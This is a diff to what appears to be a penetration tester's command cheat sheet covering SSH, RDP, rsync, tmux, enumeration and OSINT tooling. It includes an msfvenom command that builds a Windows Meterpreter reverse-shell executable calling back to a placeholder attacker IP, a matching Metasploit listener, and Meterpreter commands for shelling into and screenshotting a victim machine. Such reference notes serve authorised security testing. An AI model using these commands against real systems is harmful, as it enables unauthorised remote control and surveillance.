@@ -1,13 +1,18 @@
 # CHEATSHEETS
 
-# Start of a report
+# Reporting
+## Directory structure
 mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,'AD Enumeration'},Notes,OSINT,Wireless,'Logging output','Misc Files'},Retest}
-
 
 # Access
 
 ## SSH
 ssh <user>@<host>
+
+## RDP
+### xfreerdp
+xfreerdp /v:<ip> /u:<user> /p:<password>  # Connects to a remote Windows machine via RDP, specifying the target IP, username and password
+xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /cert:ignore  # Connects to a remote Windows machine via RDP; resizes the session on window resize and skips certificate validation prompts
 
 ### Encrypton 
 ssh-keygen -t rsa -b 2048  # Generates a 2048-bit RSA SSH key pair for passwordless authentication
@@ -17,7 +22,6 @@ ftp -p <host> <port> <username> <pass> # FTP connection in passive mode. <port>,
 # Backup
 
 ## rsync
-*
 rsync -av /path/to/mydirectory user@backup_server:/path/to/bac*kup/directory # Recursively copies a local directory to a remote server over SSH, preserving file attributes and displaying verbose output
 rsync -av user@remote_host:/path/to/backup/directory /path/to/mydirectory  # Pulls a directory from a remote server to a local destination, preserving file attributes and displaying verbose output
 rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory  # Syncs a local directory to a remote server explicitly over SSH with compression enabled
@@ -31,7 +35,6 @@ crontab -e  # Opens the current user's crontab file in the default editor for sc
 # Terminal
 
 ## Tmux
-
 prefix: Ctrl+B
 
 ### Sessions
@@ -189,7 +192,6 @@ onesixtyone -c <community_list> <target> # Brute-forces SNMP community strings o
 # Penetration testing
 
 ## Metasploit
-
 use exploit/multi/handler # Starts a Metasploit listener to catch incoming reverse shell connections from a deployed payload.
 set payload windows/meterpreter/reverse_tcp # Sets the payload to match the one used when generating the executable.
 set LHOST <Attacker's IP Address> # Specifies the attacker's IP address to listen on.
@@ -199,7 +201,6 @@ exploit  # Launches the handler and awaits the reverse connection from the targe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's IP Address> LPORT=<Attacker's Port Number> -f exe -o /path/to/output/payload.exe  # Generates a Windows Meterpreter reverse TCP payload as an executable, connecting back to the specified IP address and port upon execution.
 
 ## Meterpreter Commands
-
 sysinfo  # To view the victim's system information
 shell  # To access the command line on the victim's computer
 screenshot  # To take a screenshot of the victim's screen
@@ -210,6 +211,8 @@ screenshot  # To take a screenshot of the victim's screen
 gobuster dir -u <target> -w <file> # Performs directory brute-forcing.
 
 # MAC Address Spoofing
+
+## Network Interface Management
 sudo ifconfig eth0 down # Disables the eth0 network interface so changes can be applied.
 sudo ifconfig eth0 up # Re-enables the eth0 network interface after changes are made
 
@@ -223,7 +226,7 @@ curl -v <target> # Sends a verbose HTTP request, displaying headers and connecti
 
 # OSINT
 
-## Spidefoot
+## Spiderfoot
 spiderfoot -l <ip>:<port>  # Starts the SpiderFoot web interface and listens on the specified IP address and port.
 
 ## Google Dorks
